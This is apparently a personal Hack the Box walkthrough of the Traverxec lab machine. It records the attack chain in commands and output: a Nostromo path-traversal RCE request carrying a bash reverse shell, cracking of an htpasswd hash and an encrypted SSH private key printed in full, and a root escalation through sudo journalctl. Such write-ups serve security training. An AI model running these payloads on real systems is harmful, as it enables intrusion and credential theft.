@@ -1,0 +1,422 @@
+Traverxec - Hack the Box - Linux Easy - Mestasploit, Proxychains, Netcat, ssh2john, Code Analysis
+
+# Web server nostramus, use metasploit
+# SSH and HTTP Nostromo
+
+We do a searchsploit and find an rce for nostromo
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/traverxec]
+└──╼ $searchsploit nostromo
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                    | multiple/remote/47573.rb
+nostromo 1.9.6 - Remote Code Execution                                                                  | multiple/remote/47837.py
+nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                    | linux/remote/35466.sh
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+====================================================================================================================================
+
+Nostromo <= 1.9.6. This issue is caused by a directory traversal
+http://10.10.10.165/
+
+Commands and Output:
+====================================================================================================================================
+POST /empty.html HTTP/1.1
+Host: 10.10.10.165
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 70
+Origin: http://10.10.10.165
+DNT: 1
+Connection: close
+Referer: http://10.10.10.165/
+Sec-GPC: 1
+
+name=please&email=root%40iphone.com&subject=please&message=sjsjsjsjssj
+
+
+RESPONSE:
+HTTP/1.1 200 OK
+Date: Tue, 20 Apr 2021 22:07:12 GMT
+Server: nostromo 1.9.6
+Connection: close
+Last-Modified: Fri, 25 Oct 2019 19:36:58 GMT
+Content-Length: 55
+Content-Type: text/html
+
+No mail sent. Not yet finished. Please come back soon!
+====================================================================================================================================
+
+We run a gonuster just to verify we dont miss anything.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/traverxec]
+└──╼ $gobuster dir -u http://10.10.10.165/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o root-web.out -t 1
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.165/
+[+] Method:                  GET
+[+] Threads:                 1
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/04/20 15:09:47 Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 314] [--> http://10.10.10.165/img/]
+====================================================================================================================================
+
+We have to set the threads for gobuster to 1 since doing 10 threads causes the server to refuse connections to it.
+
+What we are goig to do now is open up metasploit.
+Commands and Output:
+====================================================================================================================================
+msf6 exploit(multi/http/nostromo_code_exec) > set rhosts 10.10.10.165
+rhosts => 10.10.10.165
+msf6 exploit(multi/http/nostromo_code_exec) > set srvhost 10.10.14.23
+srvhost => 10.10.14.23
+msf6 exploit(multi/http/nostromo_code_exec) > set lport 9001
+lport => 9001
+msf6 exploit(multi/http/nostromo_code_exec) > set Proxies http:127.0.0.1:8080
+Proxies => http:127.0.0.1:8080
+msf6 exploit(multi/http/nostromo_code_exec) > set srvport 8090
+srvport => 8090
+msf6 exploit(multi/http/nostromo_code_exec) > options
+
+Module options (exploit/multi/http/nostromo_code_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies  127.0.0.1        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   10.10.10.165     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80               yes       The target port (TCP)
+   SRVHOST  10.10.14.23      yes       The local host or network interface to listen on. This must be an address on the local machine or
+                                        0.0.0.0 to listen on all addresses.
+   SRVPORT  8090             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+   VHOST                     no        HTTP server virtual host
+====================================================================================================================================
+
+
+Using the rce, we can speicfy a shell to run on burp and get a bash shell using netcat
+Commands and Output:
+====================================================================================================================================
+POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
+Host: 10.10.10.165
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Content-Length: 61
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Connection: close
+
+echo
+echo
+bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1'
+
+
+NETCAT:
+┌─[user@parrot-virtual]─[~/htb/traverxec]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.165.
+Ncat: Connection from 10.10.10.165:36702.
+bash: cannot set terminal process group (436): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@traverxec:/usr/bin$ 
+
+====================================================================================================================================
+
+
+Once inside running linenum.sh, while inside we discover a set of credentials
+Commands and Output:
+====================================================================================================================================
+
+[-] htpasswd found - could contain passwords:
+/var/nostromo/conf/.htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+====================================================================================================================================
+
+
+We can attempt to crack the md5 hash using hashcat
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/traverxec]
+└──╼ $hashcat --example-hashes | grep -i md5 -B2 -A2
+
+MODE: 500
+TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
+PASS: hashcat
+-
+
+====================================================================================================================================
+
+We find the password for the hash.
+Commands and Output:
+====================================================================================================================================
+$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
+====================================================================================================================================
+
+We try switching to the user but that also fails using the password, so the next thing to do is analyze the configuration files
+for the server.
+
+We find the configuration file of the webserver and analyze what is inside a public_www directory we can access but not the david
+directory directly.
+Commands and Output:
+====================================================================================================================================
+www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
+# MAIN [MANDATORY]
+
+servername		traverxec.htb
+serverlisten		*
+serveradmin		david@traverxec.htb
+serverroot		/var/nostromo
+servermimes		conf/mimes
+docroot			/var/nostromo/htdocs
+docindex		index.html
+
+# LOGS [OPTIONAL]
+
+logpid			logs/nhttpd.pid
+
+# SETUID [RECOMMENDED]
+
+user			www-data
+
+# BASIC AUTHENTICATION [OPTIONAL]
+
+htaccess		.htaccess
+htpasswd		/var/nostromo/conf/.htpasswd
+
+# ALIASES [OPTIONAL]
+
+/icons			/var/nostromo/icons
+
+# HOMEDIRS [OPTIONAL]
+
+homedirs		/home
+homedirs_public		public_www
+www-data@traverxec:/var/nostromo/conf$ cd /home
+www-data@traverxec:/home$ ls
+david
+www-data@traverxec:/home$ cd david/
+www-data@traverxec:/home/david$ ls
+ls: cannot open directory '.': Permission denied
+www-data@traverxec:/home$ find . -name public_www 2>/dev/null
+www-data@traverxec:/home$ ls -ls *
+ls: cannot open directory 'david': Permission denied
+www-data@traverxec:/home$ ls -ls david/public_www
+total 8
+4 -rw-r--r-- 1 david david  402 Oct 25  2019 index.html
+4 drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
+www-data@traverxec:/home/david$ cd public_www
+www-data@traverxec:/home/david/public_www$ 
+====================================================================================================================================
+
+
+This most likely has to do with permission issues and how they are set. For example we can access the following webpage from our
+browser http://10.10.10.165/~david/
+
+We find a backup file under protected-file-area
+Commands and Output:
+====================================================================================================================================
+www-data@traverxec:/home/david/public_www$ cd protected-file-area/
+www-data@traverxec:/home/david/public_www/protected-file-area$ ls
+backup-ssh-identity-files.tgz
+====================================================================================================================================
+
+We can copy it over to our directory to further analyze it. And it's a public and private keys for david which we can use to logon
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon]
+└──╼ $ls -l
+total 372
+-rw-r--r-- 1 user user   1915 Apr 20 16:39 backup-ssh-identity-files.tgz
+-rw-r--r-- 1 user user  46631 Apr 20 15:50 LinEnum.sh
+-rwxr-xr-x 1 user user 326581 Apr 20 15:43 linpeas.sh
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon]
+└──╼ $tar xvf backup-ssh-identity-files.tgz 
+home/david/.ssh/
+home/david/.ssh/authorized_keys
+home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa.pub
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon]
+└──╼ $ls
+backup-ssh-identity-files.tgz  home  LinEnum.sh  linpeas.sh
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon]
+└──╼ $cd home/
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home]
+└──╼ $ls
+david
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home]
+└──╼ $cd david/
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home/david]
+└──╼ $ls
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home/david]
+└──╼ $ls -la
+total 0
+drwxr-xr-x 1 user user  8 Apr 20 16:41 .
+drwxr-xr-x 1 user user 10 Apr 20 16:41 ..
+drwx------ 1 user user 62 Oct 25  2019 .ssh
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home/david]
+└──╼ $cd .ssh
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home/david/.ssh]
+└──╼ $ls
+authorized_keys  id_rsa  id_rsa.pub
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home/david/.ssh]
+====================================================================================================================================
+
+
+We see that private key is encrypted, we will most likely use john to crack it
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home/david/.ssh]
+└──╼ $cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F
+
+seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
+tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
+KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
+RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
+HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
+Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
+dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
+6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
+xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
+Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
+i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
+fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
+bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
+uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
+Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
+9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
+rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
+4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
+/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
+JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
+XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
+hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
+SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
+j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
+VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
+-----END RSA PRIVATE KEY-----
+====================================================================================================================================
+
+
+ssh2john
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon]
+└──╼ $sed 's/decodestring/decodebytes/' /usr/share/john/ssh2john.py | python - home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be7i ..
+...
+...
+..
+
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon]
+└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt ssh2john.out 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hunter           (home/david/.ssh/id_rsa)
+1g 0:00:00:09 54.87% (ETA: 16:57:24) 0.1109g/s 880628p/s 880628c/s 880628C/s gb891022..gb74366
+Warning: Only 2 candidates left, minimum 4 needed for performance.
+1g 0:00:00:15 DONE (2021-04-20 16:57) 0.06297g/s 903129p/s 903129c/s 903129C/sa6_123..*7¡Vamos!
+Session completed
+====================================================================================================================================
+
+The password being hunter
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/traverxec/recon/home/david/.ssh]
+└──╼ $ssh -i id_rsa david@10.10.10.165 
+Enter passphrase for key 'id_rsa': 
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+david@traverxec:~$
+====================================================================================================================================
+
+Once logged in we check out what is in the directory and there is a bin directory that contains a set of scripts, we can apprently 
+execute journalctl as root and then execute a shell command from inside since journalctl acts like the less command
+
+Commands and Output:
+====================================================================================================================================
+david@traverxec:~$ cd bin/
+david@traverxec:~/bin$ ls
+server-stats.head  server-stats.sh
+david@traverxec:~/bin$ cat server-stats.sh 
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+
+
+david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
+-- Logs begin at Tue 2021-04-20 15:31:58 EDT, end at Tue 2021-04-20 20:09:19 EDT. --
+Apr 20 18:54:40 traverxec sudo[16019]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/1 ruser=www-data r
+Apr 20 18:54:42 traverxec sudo[16019]: pam_unix(sudo:auth): conversation failed
+Apr 20 18:54:42 traverxec sudo[16019]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Apr 20 18:54:42 traverxec sudo[16019]: www-data : command not allowed ; TTY=pts/1 ; PWD=/dev/shm ; USER=root ; COMMAND=list
+Apr 20 18:54:42 traverxec crontab[16109]: (www-data) LIST (www-data)
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+====================================================================================================================================
+
+
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
